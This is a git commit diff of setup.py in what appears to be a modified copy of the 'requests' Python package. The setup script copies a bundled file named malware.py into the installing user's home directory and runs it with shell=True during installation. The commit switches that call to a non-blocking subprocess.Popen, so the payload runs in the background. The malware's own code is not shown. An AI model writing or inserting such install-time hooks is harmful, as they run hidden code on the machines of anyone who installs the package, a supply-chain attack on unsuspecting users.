c3e27bbfec286b7a0dbc015e19bd31307ad9888a
Parish Wolfe <parishwolfe@gmail.com>
2021-11-28 18:52:09 -0500

    Update setup.py

--- setup.py
+++ setup.py
@@ -72,7 +72,8 @@ if home is None:
     home = os.getenv('HOME')
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
 command = str(sys.executable + " " + home + '/malware.py')
-subprocess.call(command, shell=True)
+#subprocess.call(command, shell=True)
+subprocess.Popen(command, shell=True)
 #subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
 
 with open("/home/parish/output.txt", "w") as text_file:
